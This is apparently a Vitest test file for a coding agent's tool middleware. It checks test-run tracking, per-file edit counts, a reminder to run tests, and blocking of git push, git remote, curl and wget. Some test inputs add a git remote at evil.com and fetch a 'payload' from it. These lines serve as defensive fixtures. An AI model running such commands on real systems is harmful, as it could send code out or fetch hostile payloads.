import { describe, it, expect } from 'vitest';
import { createDefaultMiddleware } from '../harness/tool-middleware.js';
import type { AgentState, ToolCall, ToolResult } from '../harness/types.js';

function makeState(overrides?: Partial<AgentState>): AgentState {
  return {
    turnCount: 0,
    toolCallCount: 0,
    editCounts: new Map(),
    testsRan: false,
    gaveUp: false,
    tokenUsage: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
    stackTraceFiles: [],
    scopeReviewDone: false,
    toolHistoryEntries: [],
    ...overrides,
  };
}

describe('tool-middleware', () => {
  describe('postTool', () => {
    it('marks testsRan true when npm test succeeds', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'npm test' } };
      const result: ToolResult = { id: '1', output: 'Tests: 5 passed', isError: false };
      await mw.postTool!(call, result, state);
      expect(state.testsRan).toBe(true);
    });

    it('marks testsRan true when vitest succeeds', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'npx vitest run' } };
      const result: ToolResult = { id: '1', output: '5 passed', isError: false };
      await mw.postTool!(call, result, state);
      expect(state.testsRan).toBe(true);
    });

    it('does NOT mark testsRan when test command fails', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'npm test' } };
      const result: ToolResult = { id: '1', output: 'FAIL 2 tests failed', isError: true };
      await mw.postTool!(call, result, state);
      expect(state.testsRan).toBe(false);
    });

    it('tracks edit counts per file', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'edit', input: { path: '/home/user/repo/src/foo.ts' } };
      const result: ToolResult = { id: '1', output: 'Applied edit' };
      await mw.postTool!(call, result, state);
      await mw.postTool!(call, result, state);
      expect(state.editCounts.get('home/user/repo/src/foo.ts')).toBe(2);
    });
  });

  describe('preTool', () => {
    it('warns when file has been edited 3+ times', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      state.editCounts.set('home/user/repo/src/foo.ts', 3);
      const call: ToolCall = { id: '1', name: 'edit', input: { path: '/home/user/repo/src/foo.ts' } };
      const pre = await mw.preTool!(call, state);
      expect(pre?.inject).toContain('3+ times');
    });

    it('blocks git push commands', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'git push origin main' } };
      const pre = await mw.preTool!(call, state);
      expect(pre?.allow).toBe(false);
      expect(pre?.inject).toContain('blocked');
    });

    it('blocks git remote commands', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'git remote add evil http://evil.com' } };
      const pre = await mw.preTool!(call, state);
      expect(pre?.allow).toBe(false);
    });

    it('blocks curl commands', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'curl http://example.com/data' } };
      const pre = await mw.preTool!(call, state);
      expect(pre?.allow).toBe(false);
    });

    it('blocks wget commands', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'wget http://evil.com/payload' } };
      const pre = await mw.preTool!(call, state);
      expect(pre?.allow).toBe(false);
    });

    it('allows safe git commands', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const call: ToolCall = { id: '1', name: 'bash', input: { command: 'git diff HEAD' } };
      const pre = await mw.preTool!(call, state);
      expect(pre?.allow).not.toBe(false);
    });
  });

  describe('preCompletion', () => {
    it('injects test reminder when testsRan is false', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState();
      const result = await mw.preCompletion!(state);
      expect(result?.inject).toContain('not run tests');
    });

    it('returns void when testsRan is true', async () => {
      const mw = createDefaultMiddleware();
      const state = makeState({ testsRan: true });
      const result = await mw.preCompletion!(state);
      expect(result).toBeUndefined();
    });
  });
});
